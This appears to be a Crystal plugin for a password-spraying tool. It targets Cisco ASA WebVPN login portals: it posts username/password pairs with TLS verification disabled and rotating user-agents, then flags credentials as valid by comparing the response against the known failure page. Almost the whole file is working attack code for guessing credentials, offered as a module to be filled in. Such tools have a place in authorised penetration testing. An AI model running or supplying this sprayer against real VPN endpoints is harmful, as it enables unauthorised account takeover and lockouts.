require "http/client"

class Cisco_VPN < Sprayer

    ## only uncomment if needed
    # def initialize(usernames : Array(String), password : Array(String))
    #     # init any special or default variables here
    #     super()
    # end

    # returns an array of [username, password, valid, lockout, mfa]
    def spray(username : String, password : String) 
        lockedout = false
        valid = false
        mfa = false

        #
        # YOUR CODE BELOW
        #

        path = "/+webvpn+/index.html"
        # some basic setups for web based auth 
        url = URI.parse @target
        # gotta set no verify for tls pages
        context = OpenSSL::SSL::Context::Client.new
        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
        # create a http client 
        client = HTTP::Client.new(url, tls: context)
        # and some basic header options
        header = HTTP::Headers{ # headers for post request 
            "User-Agent" => @useragents[rand(0..@useragents.size)],
            "Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language" => "en-US,en;q=0.5",
            "Accept-Encoding" => "gzip, deflate",
            "Content-Type" => "application/x-www-form-urlencoded"
        }
        form = "tgroup=&next=&tgcookieset=&username=#{URI.encode_www_form(username)}&password=#{URI.encode_www_form(password)}&Login=Login" 
        
        # here is the basic 
        page = client.post(path, headers: header, form: form)
        # p page.body
        
        if page.status_code == 200 && page.body != "<html>\n<head>\n<script>\ndocument.location.replace(\"/+CSCOE+/logon.html?\"+\n\"a0=8\"+\n\"&a1=\"+\n\"&a2=\"+\n\"&a3=1\");\n</script>\n</head>\n</html>\n\n\n"
            valid = true 
        end




        #
        # end of your CODE make sure you set valid lockedout and mfa 
        # 
        
        return [username, password, valid, lockedout, mfa]
    end
end